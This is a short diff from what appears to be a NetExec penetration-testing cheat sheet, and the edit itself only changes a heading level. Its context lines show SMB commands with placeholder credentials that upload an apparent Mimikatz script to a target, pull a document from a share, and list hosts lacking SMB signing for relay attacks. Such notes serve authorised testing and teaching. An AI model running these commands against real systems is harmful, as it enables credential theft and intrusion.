@@ -49,7 +49,7 @@ nxc smb <ip> -u '<username>' -p '<password>' --put-file /workspace/Invoke-Mimi.p
 nxc smb <ip> -u '<username>' -p '<password>' --get-file \\users\\public\\File.docx /workspace/File.docx
 
 
-## Save a list of relays (SMB signing = False)
+# Save a list of relays (SMB signing = False)
 nxc smb <ip> --gen-relay-list relay-list.txt
 
 
